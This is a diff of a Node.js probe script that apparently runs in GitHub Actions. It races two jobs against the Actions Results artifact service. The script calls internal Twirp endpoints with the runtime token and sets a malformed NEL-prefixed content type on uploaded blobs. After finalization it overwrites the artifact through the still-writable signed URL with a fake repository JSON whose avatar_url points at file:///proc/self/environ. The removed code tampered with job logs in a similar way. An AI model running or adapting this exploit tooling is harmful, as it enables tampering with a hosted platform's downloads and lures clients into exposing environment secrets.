@@ -1,62 +1,52 @@
 'use strict';
 
+// Bounded cross-job Actions Results race for Repo Cassette.  Two jobs in the
+// same workflow run use one artifact name per case.  The v6 job supplies the
+// NEL-prefixed MIME accepted by old artifact versions; the v7 job supplies the
+// raw-delivery version with a valid MIME.  The probe prints no bearer token or
+// signed storage URL and a dependent cleanup job removes every test artifact.
+
 const crypto = require('node:crypto');
-const fs = require('node:fs');
-const http = require('node:http');
 const https = require('node:https');
-const tls = require('node:tls');
 
-const WEIRD_CONTENT_TYPE = 'application/json\x85';
-const ARTIFACT_MIME_TYPE = 'application/json';
-const ARTIFACT_SERVICE = 'github.actions.results.api.v1.ArtifactService';
-const ARTIFACT_BYTES = 1024;
-const RAW_RESPONSE_LIMIT = 2 * 1024 * 1024;
+const SERVICE = 'github.actions.results.api.v1.ArtifactService';
+const ODD = '\x85application/json';
+const ODD_HEX = Buffer.from(ODD, 'latin1').toString('hex');
+const BYTES = 512;
+const OFFSETS = [-25, -10, -5, -2, -1, 0, 1, 2, 5, 10, 25, -3, 0, 3, 0, 0];
 
-function fail(message) {
-  throw new Error(message);
-}
+function sleep(ms) { return new Promise(resolve => setTimeout(resolve, ms)); }
 
-function backendIds(token) {
-  const parts = token.split('.');
-  if (parts.length < 2) fail('ACTIONS_RUNTIME_TOKEN is not a JWT');
-  const claims = JSON.parse(Buffer.from(parts[1], 'base64url').toString('utf8'));
-  const scope = String(claims.scp || '')
-    .split(' ')
-    .find((candidate) => candidate.startsWith('Actions.Results:'));
-  if (!scope) fail('runtime token has no Actions.Results scope');
-  const fields = scope.split(':');
-  if (fields.length !== 3) fail('malformed Actions.Results scope');
-  return { workflowRunBackendId: fields[1], workflowJobRunBackendId: fields[2] };
-}
-
-function request(urlString, { method = 'GET', headers = {}, body = null } = {}) {
-  const url = new URL(urlString);
-  const transport = url.protocol === 'https:' ? https : http;
+function request(url, {method = 'GET', headers = {}, body = null} = {}) {
   return new Promise((resolve, reject) => {
-    const req = transport.request(url, { method, headers }, (res) => {
+    const req = https.request(url, {method, headers}, response => {
       const chunks = [];
-      res.on('data', (chunk) => chunks.push(chunk));
-      res.on('end', () => resolve({
-        status: res.statusCode || 0,
-        headers: res.headers,
+      response.on('data', chunk => chunks.push(Buffer.from(chunk)));
+      response.on('end', () => resolve({
+        status: response.statusCode || 0,
+        headers: response.headers,
+        rawHeaders: response.rawHeaders || [],
         body: Buffer.concat(chunks),
       }));
     });
+    req.setTimeout(20000, () => req.destroy(new Error('HTTP timeout')));
     req.on('error', reject);
-    if (body) req.end(body);
-    else req.end();
+    req.end(body);
   });
 }
 
-async function twirp(method, token, value) {
-  return twirpService(ARTIFACT_SERVICE, method, token, value);
+function backendIds(token) {
+  const claims = JSON.parse(Buffer.from(token.split('.')[1], 'base64url').toString());
+  const scope = String(claims.scp || '').split(' ').find(x => x.startsWith('Actions.Results:'));
+  const fields = scope?.split(':') || [];
+  if (fields.length !== 3) throw new Error('Actions.Results scope unavailable');
+  return {run: fields[1], job: fields[2]};
 }
 
-async function twirpService(service, method, token, value) {
+async function twirp(method, token, value) {
   const origin = new URL(process.env.ACTIONS_RESULTS_URL).origin;
-  const url = new URL(`/twirp/${service}/${method}`, origin);
   const body = Buffer.from(JSON.stringify(value));
-  const response = await request(url.href, {
+  const response = await request(`${origin}/twirp/${SERVICE}/${method}`, {
     method: 'POST',
     headers: {
       authorization: `Bearer ${token}`,
@@ -66,430 +56,238 @@ async function twirpService(service, method, token, value) {
     },
     body,
   });
-  if (response.status < 200 || response.status >= 300) {
-    fail(`${method} failed with HTTP ${response.status}: ${response.body.toString('utf8')}`);
-  }
-  return JSON.parse(response.body.toString('utf8'));
+  let parsed = {};
+  try { parsed = JSON.parse(response.body.toString()); } catch {}
+  return {response, parsed};
 }
 
-async function putBlob(url, body) {
-  const response = await request(url, {
+async function api(path, {method = 'GET'} = {}) {
+  return request(`https://api.github.com${path}`, {
+    method,
+    headers: {
+      accept: 'application/vnd.github.v3+json',
+      authorization: `Bearer ${process.env.GITHUB_TOKEN}`,
+      'user-agent': 'repo-cassette-cross-job-probe',
+      'x-github-api-version': '2022-11-28',
+      ...(method === 'DELETE' ? {'content-length': '0'} : {}),
+    },
+  });
+}
+
+async function put(url, body) {
+  return request(url, {
     method: 'PUT',
     headers: {
       'content-type': 'application/octet-stream',
       'content-length': String(body.length),
       'x-ms-blob-type': 'BlockBlob',
-      'x-ms-blob-content-type': WEIRD_CONTENT_TYPE,
+      'x-ms-blob-content-type': ODD,
     },
     body,
   });
-  if (response.status < 200 || response.status >= 300) {
-    fail(`blob PUT failed with HTTP ${response.status}: ${response.body.toString('utf8')}`);
-  }
 }
 
-function decodeChunked(body) {
-  const chunks = [];
-  let offset = 0;
-  while (true) {
-    const lineEnd = body.indexOf('\r\n', offset, 'latin1');
-    if (lineEnd < 0) fail('truncated chunk-size line');
-    const token = body.subarray(offset, lineEnd).toString('ascii').split(';', 1)[0];
-    if (!/^[0-9a-fA-F]+$/.test(token)) fail('invalid chunk-size line');
-    const size = Number.parseInt(token, 16);
-    offset = lineEnd + 2;
-    if (size === 0) return Buffer.concat(chunks);
-    if (offset + size + 2 > body.length) fail('truncated chunk body');
-    chunks.push(body.subarray(offset, offset + size));
-    offset += size;
-    if (body[offset] !== 0x0d || body[offset + 1] !== 0x0a) {
-      fail('invalid chunk terminator');
-    }
-    offset += 2;
-  }
-}
-
-function parseRawResponse(raw) {
-  const boundary = raw.indexOf('\r\n\r\n', 0, 'latin1');
-  if (boundary < 0) fail('HTTP response omitted its header terminator');
-  const lines = raw.subarray(0, boundary).toString('latin1').split('\r\n');
-  const match = /^HTTP\/1\.[01] (\d{3})(?: |$)/.exec(lines.shift() || '');
-  if (!match) fail('invalid HTTP status line');
-  const headers = new Map();
-  for (const line of lines) {
-    const colon = line.indexOf(':');
-    if (colon <= 0) fail('invalid HTTP response header');
-    const name = line.slice(0, colon).toLowerCase();
-    const value = line.slice(colon + 1).replace(/^[ \t]+/, '');
-    if (!headers.has(name)) headers.set(name, []);
-    headers.get(name).push(value);
-  }
-  let body = raw.subarray(boundary + 4);
-  const transferEncoding = (headers.get('transfer-encoding') || []).join(',').toLowerCase();
-  if (transferEncoding.split(',').map((item) => item.trim()).includes('chunked')) {
-    body = decodeChunked(body);
-  } else if (headers.has('content-length')) {
-    const length = Number((headers.get('content-length') || [])[0]);
-    if (!Number.isSafeInteger(length) || length < 0 || body.length < length) {
-      fail('invalid or truncated Content-Length response');
-    }
-    body = body.subarray(0, length);
-  }
-  return { status: Number(match[1]), headers, body };
-}
-
-function rawTlsGet(urlString, headers = {}) {
-  const url = new URL(urlString);
-  if (url.protocol !== 'https:') fail('live verification requires HTTPS');
-  const authority = url.port ? `${url.hostname}:${url.port}` : url.hostname;
-  const lines = [
-    `GET ${url.pathname}${url.search} HTTP/1.1`,
-    `Host: ${authority}`,
-    'Connection: close',
-    'Accept-Encoding: identity',
-    ...Object.entries(headers).map(([name, value]) => `${name}: ${value}`),
-    '',
-    '',
-  ];
-  const requestBytes = Buffer.from(lines.join('\r\n'), 'latin1');
-
-  return new Promise((resolve, reject) => {
-    const chunks = [];
-    let length = 0;
-    let settled = false;
-    const finish = (error, value) => {
-      if (settled) return;
-      settled = true;
-      if (error) reject(error);
-      else resolve(value);
-    };
-    const socket = tls.connect({
-      host: url.hostname,
-      port: Number(url.port || 443),
-      servername: url.hostname,
-      ALPNProtocols: ['http/1.1'],
-    }, () => socket.write(requestBytes));
-    socket.setTimeout(12000, () => {
-      socket.destroy();
-      finish(new Error(`timed out reading ${url.hostname}`));
-    });
-    socket.on('data', (chunk) => {
-      length += chunk.length;
-      if (length > RAW_RESPONSE_LIMIT) {
-        socket.destroy();
-        finish(new Error(`oversized response from ${url.hostname}`));
-        return;
-      }
-      chunks.push(Buffer.from(chunk));
-    });
-    socket.on('end', () => {
-      try {
-        finish(null, parseRawResponse(Buffer.concat(chunks)));
-      } catch (error) {
-        finish(error);
-      }
-    });
-    socket.on('error', (error) => finish(error));
-  });
-}
-
-function firstHeader(response, name) {
-  const values = response.headers.get(name.toLowerCase()) || [];
-  return values.length ? values[0] : '';
-}
-
-async function verifyRestArtifact(repositoryPath, token, expectedBody) {
-  const apiBase = (process.env.GITHUB_API_URL || 'https://api.github.com').replace(/\/$/, '');
-  const endpoint = `${apiBase}/repos/${repositoryPath}`;
-  let response;
-  for (let attempt = 1; attempt <= 6; attempt++) {
-    response = await rawTlsGet(endpoint, {
-      Accept: 'application/vnd.github.v3+json',
-      Authorization: `Bearer ${token}`,
-      'User-Agent': 'repo-cassette-artifact-check',
-      'X-GitHub-Api-Version': '2022-11-28',
-    });
-    if (response.status !== 404 && response.status !== 409) break;
-    await new Promise((resolve) => setTimeout(resolve, 1000));
-  }
-
-  if (response.status >= 300 && response.status < 400) {
-    const location = firstHeader(response, 'location');
-    if (!location) fail(`artifact redirect ${response.status} omitted Location`);
-    response = await rawTlsGet(new URL(location, endpoint).href, {
-      'User-Agent': 'repo-cassette-artifact-check',
-    });
-  }
-  if (response.status !== 200) {
-    fail(`artifact REST download failed with HTTP ${response.status}`);
-  }
-
-  const typeBytes = Buffer.from(firstHeader(response, 'content-type'), 'latin1');
-  const expectedType = Buffer.concat([
-    Buffer.from('application/json', 'ascii'),
-    Buffer.from([0x85]),
-  ]);
-  if (!typeBytes.equals(expectedType)) {
-    fail(`artifact Content-Type bytes were ${typeBytes.toString('hex')}, expected ${expectedType.toString('hex')}`);
-  }
-  const actualDigest = crypto.createHash('sha256').update(response.body).digest('hex');
-  const expectedDigest = crypto.createHash('sha256').update(expectedBody).digest('hex');
-  if (actualDigest !== expectedDigest) {
-    fail(`artifact body SHA-256 was ${actualDigest}, expected ${expectedDigest}`);
-  }
-  return { contentTypeHex: typeBytes.toString('hex'), digest: actualDigest };
-}
-
-function repositoryPayload(repositoryPath) {
+function payload(repository, artifactId, role) {
+  const path = `${repository}/actions/artifacts/${artifactId}/zip`;
   const document = {
-    full_name: repositoryPath,
-    owner: { login: 'cassette', avatar_url: 'file:///proc/self/environ' },
-    description: '',
+    full_name: path,
+    owner: {login: role, avatar_url: 'file:///proc/self/environ'},
+    description: 'cross-job v6/v7 transport probe',
     stargazers_count: 0,
     padding: '',
   };
   const base = Buffer.from(JSON.stringify(document));
-  const paddingLength = ARTIFACT_BYTES - base.length;
-  if (paddingLength < 0) fail('repository path is too long for probe payload');
-  document.padding = 'A'.repeat(paddingLength);
-  const payload = Buffer.from(JSON.stringify(document));
-  if (payload.length !== ARTIFACT_BYTES) fail('probe payload padding failed');
-  return payload;
+  document.padding = 'A'.repeat(BYTES - base.length);
+  const result = Buffer.from(JSON.stringify(document));
+  if (result.length !== BYTES) throw new Error('payload padding failed');
+  return result;
 }
 
-async function currentRestJobId(githubRepository, githubToken) {
-  const apiBase = (process.env.GITHUB_API_URL || 'https://api.github.com').replace(/\/$/, '');
-  const runId = process.env.GITHUB_RUN_ID;
-  if (!runId) fail('GITHUB_RUN_ID is missing');
-  const response = await request(`${apiBase}/repos/${githubRepository}/actions/runs/${runId}/jobs?per_page=100`, {
-    headers: {
-      Accept: 'application/vnd.github+json',
-      Authorization: `Bearer ${githubToken}`,
-      'User-Agent': 'repo-cassette-step-log-probe',
-      'X-GitHub-Api-Version': '2022-11-28',
-    },
-  });
-  if (response.status !== 200) fail(`job listing failed with HTTP ${response.status}`);
-  const jobs = JSON.parse(response.body.toString('utf8')).jobs;
-  if (!Array.isArray(jobs)) fail('job listing omitted jobs');
-  const current = jobs.filter((job) => job && job.status === 'in_progress');
-  if (current.length !== 1 || !Number.isSafeInteger(current[0].id)) {
-    fail(`could not identify the current REST job (${current.length} in progress)`);
-  }
-  return String(current[0].id);
-}
-
-async function replaceJobLog(url, body, contentType) {
-  let response = await request(url, {
-    method: 'PUT',
-    headers: {
-      'content-type': 'application/octet-stream',
-      'content-length': String(body.length),
-      'x-ms-blob-type': 'BlockBlob',
-      'x-ms-blob-content-type': contentType,
-    },
-    body,
-  });
-  if (response.status >= 200 && response.status < 300) return 'block';
-
-  response = await request(url, {
-    method: 'PUT',
-    headers: {
-      'content-type': 'application/octet-stream',
-      'content-length': '0',
-      'x-ms-blob-type': 'AppendBlob',
-      'x-ms-blob-content-type': contentType,
-    },
-    body: Buffer.alloc(0),
-  });
-  if (response.status < 200 || response.status >= 300) {
-    const errorCode = response.headers['x-ms-error-code'] || 'unknown';
-    fail(`job-log reset failed with HTTP ${response.status} (${errorCode})`);
-  }
-  response = await request(`${url}&comp=appendblock&seal=true`, {
-    method: 'PUT',
-    headers: {
-      'content-type': 'application/octet-stream',
-      'content-length': String(body.length),
-      'x-ms-blob-sealed': 'true',
-    },
-    body,
-  });
-  if (response.status < 200 || response.status >= 300) {
-    const errorCode = response.headers['x-ms-error-code'] || 'unknown';
-    fail(`job-log append failed with HTTP ${response.status} (${errorCode})`);
-  }
-  return 'append';
-}
-
-async function readPublicLog(repositoryPath, githubToken) {
-  const apiBase = (process.env.GITHUB_API_URL || 'https://api.github.com').replace(/\/$/, '');
-  const endpoint = `${apiBase}/repos/${repositoryPath}`;
-  let response;
-  for (let attempt = 1; attempt <= 10; attempt++) {
-    response = await rawTlsGet(endpoint, {
-      Accept: 'application/vnd.github.v3+json',
-      Authorization: `Bearer ${githubToken}`,
-      'User-Agent': 'repo-cassette-step-log-probe',
-      'X-GitHub-Api-Version': '2022-11-28',
-    });
-    if (response.status >= 300 && response.status < 400) {
-      const location = firstHeader(response, 'location');
-      if (!location) fail(`log redirect ${response.status} omitted Location`);
-      response = await rawTlsGet(new URL(location, endpoint).href, {
-        'User-Agent': 'repo-cassette-step-log-probe',
-      });
-      if (response.status === 200) return response;
+function contentTypes(response) {
+  const raw = [];
+  for (let i = 0; i + 1 < response.rawHeaders.length; i += 2) {
+    if (String(response.rawHeaders[i]).toLowerCase() === 'content-type') {
+      raw.push(Buffer.from(String(response.rawHeaders[i + 1]), 'latin1').toString('hex'));
     }
-    if (![202, 404, 409].includes(response.status)) break;
-    await new Promise((resolve) => setTimeout(resolve, 1000));
   }
-  fail(`log REST download failed with HTTP ${response.status}`);
+  const collapsed = response.headers['content-type'];
+  const values = Array.isArray(collapsed) ? collapsed : collapsed === undefined ? [] : [collapsed];
+  return {
+    raw,
+    collapsed: values.map(x => Buffer.from(String(x), 'latin1').toString('hex')),
+  };
 }
 
-async function probeJobLog(token, githubRepository, ids) {
-  const githubToken = process.env.GITHUB_TOKEN;
-  if (!githubToken) fail('GITHUB_TOKEN is missing');
-  const jobId = await currentRestJobId(githubRepository, githubToken);
-  const candidates = [
-    { label: 'json-control', contentType: 'application/json' },
-    { label: 'json-nel', contentType: WEIRD_CONTENT_TYPE },
-  ];
-  const repositoryPath = `${githubRepository}/actions/jobs/${jobId}/logs`;
-  const payload = repositoryPayload(repositoryPath);
+async function readArtifact(repository, artifactId) {
+  let first = await api(`/repos/${repository}/actions/artifacts/${artifactId}/zip`);
+  let final = first;
+  if (first.status >= 300 && first.status < 400 && first.headers.location) {
+    final = await request(first.headers.location, {
+      headers: {'user-agent': 'repo-cassette-cross-job-probe'},
+    });
+  }
+  let document = null;
+  try { document = JSON.parse(final.body.toString('utf8')); } catch {}
+  const expectedPath = `${repository}/actions/artifacts/${artifactId}/zip`;
+  const types = contentTypes(final);
+  return {
+    artifactId: String(artifactId),
+    firstStatus: first.status,
+    finalStatus: final.status,
+    contentTypes: types,
+    bytes: final.body.length,
+    bodySha256: crypto.createHash('sha256').update(final.body).digest('hex'),
+    bodyRouteMatch: document?.full_name === expectedPath,
+    bodyRole: typeof document?.owner?.login === 'string' ? document.owner.login : '',
+    winner: final.status === 200 && types.raw.includes(ODD_HEX) && document?.full_name === expectedPath,
+  };
+}
 
-  for (const candidate of candidates) {
-    const signed = await twirpService(
-      'results.services.receiver.Receiver',
-      'GetJobLogsSignedBlobURL',
-      token,
-      {
-        workflow_run_backend_id: ids.workflowRunBackendId,
-        workflow_job_run_backend_id: ids.workflowJobRunBackendId,
-      },
-    );
-    const logsUrl = signed.logs_url || signed.logsUrl;
-    if (typeof logsUrl !== 'string') fail(`${candidate.label} signed response omitted logs URL`);
-    const method = await replaceJobLog(logsUrl, payload, candidate.contentType);
-    const uploadedAt = new Date().toISOString();
-    const metadata = await twirpService(
-      'results.services.receiver.Receiver',
-      'CreateJobLogsMetadata',
-      token,
-      {
-        workflow_run_backend_id: ids.workflowRunBackendId,
-        workflow_job_run_backend_id: ids.workflowJobRunBackendId,
-        uploaded_at: uploadedAt,
-        line_count: 1,
-      },
-    );
-    if (metadata.ok !== true) fail(`${candidate.label} job-log metadata returned ok=${metadata.ok}`);
-    const response = await readPublicLog(repositoryPath, githubToken);
-    const contentTypeHex = Buffer.from(firstHeader(response, 'content-type'), 'latin1').toString('hex');
-    const digest = crypto.createHash('sha256').update(response.body).digest('hex');
-    const expectedDigest = crypto.createHash('sha256').update(payload).digest('hex');
-    process.stdout.write(
-      `job-log-probe=${candidate.label}:job=${jobId}:upload=${method}:` +
-      `status=${response.status}:content-type-hex=${contentTypeHex}:` +
-      `body-sha256=${digest}:body-match=${digest === expectedDigest}\n`,
-    );
+async function runInfo(repository) {
+  const run = await api(`/repos/${repository}/actions/runs/${process.env.GITHUB_RUN_ID}`);
+  if (run.status !== 200) throw new Error(`run lookup HTTP ${run.status}`);
+  const value = JSON.parse(run.body.toString());
+  return {created: Date.parse(value.created_at)};
+}
+
+async function waitForPeer(repository) {
+  for (let attempt = 0; attempt < 40; attempt += 1) {
+    const response = await api(`/repos/${repository}/actions/runs/${process.env.GITHUB_RUN_ID}/jobs?per_page=100`);
+    if (response.status === 200) {
+      const jobs = JSON.parse(response.body.toString()).jobs || [];
+      const active = new Set(jobs.filter(x => x.status === 'in_progress').map(x => x.name));
+      if (active.has('race-v6') && active.has('race-v7')) return;
+    }
+    await sleep(1000);
+  }
+  throw new Error('peer job did not become active');
+}
+
+async function listCaseIds(repository, name) {
+  for (let attempt = 0; attempt < 4; attempt += 1) {
+    const response = await api(`/repos/${repository}/actions/runs/${process.env.GITHUB_RUN_ID}/artifacts?per_page=100&name=${encodeURIComponent(name)}`);
+    if (response.status === 200) {
+      const artifacts = JSON.parse(response.body.toString()).artifacts || [];
+      const ids = artifacts.filter(x => x.name === name).map(x => String(x.id));
+      if (ids.length) return [...new Set(ids)];
+    }
+    await sleep(400);
+  }
+  return [];
+}
+
+async function waitUntil(epoch) {
+  const delay = epoch - Date.now();
+  if (delay > 0) await sleep(delay);
+}
+
+function errorText(result) {
+  if (result.response.status < 400) return '';
+  return result.response.body.toString('utf8').slice(0, 180);
+}
+
+async function race() {
+  const role = process.env.ROLE;
+  if (!['v6', 'v7'].includes(role)) throw new Error('ROLE must be v6 or v7');
+  const token = process.env.ACTIONS_RUNTIME_TOKEN;
+  const repository = process.env.GITHUB_REPOSITORY;
+  if (!token || !repository || !process.env.GITHUB_TOKEN) throw new Error('Actions environment incomplete');
+  const ids = backendIds(token);
+  await waitForPeer(repository);
+  const info = await runInfo(repository);
+  if (!Number.isFinite(info.created)) throw new Error('run created_at unavailable');
+
+  // Both jobs derive this from the immutable run timestamp.  Three minutes is
+  // enough for ordinary hosted-runner startup and keeps every case aligned.
+  let start = info.created + 180000;
+  while (start < Date.now() + 15000) start += 60000;
+  const roleOffset = role === 'v7' ? 1 : 0;
+  console.log(`CROSS_JOB_START ${JSON.stringify({role, start, cases: OFFSETS.length})}`);
+
+  for (let index = 0; index < OFFSETS.length; index += 1) {
+    const name = `cross-job-${process.env.GITHUB_RUN_ID}-${index}`;
+    const target = start + index * 2500;
+    const offset = role === 'v7' ? OFFSETS[index] : 0;
+    await waitUntil(target + offset);
+    const createdAt = Date.now();
+    const create = await twirp('CreateArtifact', token, {
+      workflow_run_backend_id: ids.run,
+      workflow_job_run_backend_id: ids.job,
+      name,
+      version: role === 'v6' ? 6 : 7,
+      mime_type: role === 'v6' ? ODD : 'application/json',
+    });
+    const url = create.parsed.signed_upload_url || create.parsed.signedUploadUrl || '';
+    const row = {
+      index,
+      role,
+      requestedOffsetMs: offset,
+      createStartedDeltaMs: createdAt - target,
+      createStatus: create.response.status,
+      createOk: Boolean(create.parsed.ok),
+      createError: errorText(create),
+      uploadStatus: 0,
+      finalizeStatus: 0,
+      artifactId: '',
+      visibleIds: [],
+      downloads: [],
+    };
+
+    if (create.response.status >= 200 && create.response.status < 300 && create.parsed.ok && url) {
+      const upload = await put(url, Buffer.alloc(BYTES, 0x20));
+      row.uploadStatus = upload.status;
+      await waitUntil(target + 1000);
+      const finalized = await twirp('FinalizeArtifact', token, {
+        workflow_run_backend_id: ids.run,
+        workflow_job_run_backend_id: ids.job,
+        name,
+        size: String(BYTES),
+      });
+      row.finalizeStatus = finalized.response.status;
+      row.artifactId = String(finalized.parsed.artifact_id || finalized.parsed.artifactId || '');
+      if (/^\d+$/.test(row.artifactId)) {
+        const rewritten = await put(url, payload(repository, row.artifactId, role));
+        row.rewriteStatus = rewritten.status;
+      }
+    }
+
+    await waitUntil(target + 1600);
+    row.visibleIds = await listCaseIds(repository, name);
+    for (const artifactId of row.visibleIds) {
+      try { row.downloads.push(await readArtifact(repository, artifactId)); }
+      catch (error) { row.downloads.push({artifactId, error: String(error.message || error)}); }
+    }
+    console.log(`CROSS_JOB_RESULT ${JSON.stringify(row)}`);
+    const winner = row.downloads.find(x => x.winner);
+    if (winner) console.log(`CROSS_JOB_WINNER ${JSON.stringify({index, role, artifactId: winner.artifactId})}`);
   }
 }
 
-function writeOutput(name, value) {
-  if (process.env.GITHUB_OUTPUT) {
-    fs.appendFileSync(process.env.GITHUB_OUTPUT, `${name}=${value}\n`);
+async function cleanup() {
+  const repository = process.env.GITHUB_REPOSITORY;
+  let deleted = 0;
+  for (let page = 1; page <= 3; page += 1) {
+    const response = await api(`/repos/${repository}/actions/runs/${process.env.GITHUB_RUN_ID}/artifacts?per_page=100&page=${page}`);
+    if (response.status !== 200) throw new Error(`cleanup listing HTTP ${response.status}`);
+    const artifacts = JSON.parse(response.body.toString()).artifacts || [];
+    for (const artifact of artifacts) {
+      if (!String(artifact.name).startsWith(`cross-job-${process.env.GITHUB_RUN_ID}-`)) continue;
+      const removed = await api(`/repos/${repository}/actions/artifacts/${artifact.id}`, {method: 'DELETE'});
+      if (![204, 404].includes(removed.status)) throw new Error(`cleanup delete HTTP ${removed.status}`);
+      deleted += 1;
+    }
+    if (artifacts.length < 100) break;
   }
+  console.log(`CROSS_JOB_CLEANUP ${JSON.stringify({deleted})}`);
 }
 
 async function main() {
-  const token = process.env.ACTIONS_RUNTIME_TOKEN;
-  const resultsUrl = process.env.ACTIONS_RESULTS_URL;
-  const githubRepository = process.env.GITHUB_REPOSITORY;
-  if (!token || !resultsUrl || !githubRepository) {
-    fail('this script must run as a JavaScript action on GitHub Actions');
-  }
-
-  const ids = backendIds(token);
-  if (process.env.JOB_LOG_PROBE === '1') {
-    await probeJobLog(token, githubRepository, ids);
-    return;
-  }
-  const artifactName = `repo-cassette-${process.env.GITHUB_RUN_ID || Date.now()}-${process.env.GITHUB_RUN_ATTEMPT || 1}.json`;
-  const common = {
-    workflow_run_backend_id: ids.workflowRunBackendId,
-    workflow_job_run_backend_id: ids.workflowJobRunBackendId,
-    name: artifactName,
-  };
-
-  const created = await twirp('CreateArtifact', token, {
-    ...common,
-    version: 7,
-    // The Results service validates this metadata field as of October 2026.
-    // The raw download's Content-Type is controlled independently by the
-    // Azure blob property set in putBlob().
-    mime_type: ARTIFACT_MIME_TYPE,
-  });
-  const signedUploadUrl = created.signed_upload_url || created.signedUploadUrl;
-  if (!created.ok || typeof signedUploadUrl !== 'string') {
-    fail('CreateArtifact returned an invalid response');
-  }
-
-  // Finalization reveals the numeric artifact ID. The SAS remains writable, so
-  // first finalize a fixed-size placeholder and then replace it with an equally
-  // sized ID-bound repository document. Keeping the recorded size correct also
-  // makes the artifact work through download frontends that trust metadata.
-  const placeholder = Buffer.alloc(ARTIFACT_BYTES, 0x20);
-  await putBlob(signedUploadUrl, placeholder);
-  const finalized = await twirp('FinalizeArtifact', token, {
-    ...common,
-    size: String(placeholder.length),
-  });
-  const finalizedArtifactId = finalized.artifact_id || finalized.artifactId;
-  if (!finalized.ok || !/^\d+$/.test(String(finalizedArtifactId || ''))) {
-    fail('FinalizeArtifact did not return a numeric artifact ID');
-  }
-
-  const artifactId = String(finalizedArtifactId);
-  const repositoryPath = `${githubRepository}/actions/artifacts/${artifactId}/zip`;
-  const document = {
-    full_name: repositoryPath,
-    owner: { login: 'cassette', avatar_url: 'file:///proc/self/environ' },
-    description: '',
-    stargazers_count: 0,
-    padding: '',
-  };
-  const unpadded = Buffer.from(JSON.stringify(document));
-  const paddingLength = ARTIFACT_BYTES - unpadded.length;
-  if (paddingLength < 0) fail('repository path is too long for the artifact');
-  document.padding = 'A'.repeat(paddingLength);
-  const payload = Buffer.from(JSON.stringify(document));
-  if (payload.length !== ARTIFACT_BYTES) fail('payload padding calculation failed');
-  await putBlob(signedUploadUrl, payload);
-
-  let liveCheck = 'skipped';
-  if (process.env.GITHUB_TOKEN) {
-    const verified = await verifyRestArtifact(repositoryPath, process.env.GITHUB_TOKEN, payload);
-    liveCheck = `ok:${verified.contentTypeHex}:${verified.digest}`;
-  }
-
-  writeOutput('artifact_id', artifactId);
-  writeOutput('repository_path', repositoryPath);
-  writeOutput('payload_sha256', crypto.createHash('sha256').update(payload).digest('hex'));
-  writeOutput('payload_base64', payload.toString('base64'));
-  writeOutput('live_check', liveCheck);
-  process.stdout.write(`artifact_id=${artifactId}\nrepository_path=${repositoryPath}\nlive_check=${liveCheck}\n`);
+  if (process.env.ROLE === 'cleanup') return cleanup();
+  return race();
 }
 
-if (require.main === module) {
-  main().catch((error) => {
-    process.stderr.write(`${error.stack || error}\n`);
-    process.exitCode = 1;
-  });
-}
-
-module.exports = {
-  decodeChunked,
-  parseRawResponse,
-};
+main().catch(error => {
+  console.error(error.stack || error);
+  process.exitCode = 1;
+});
 
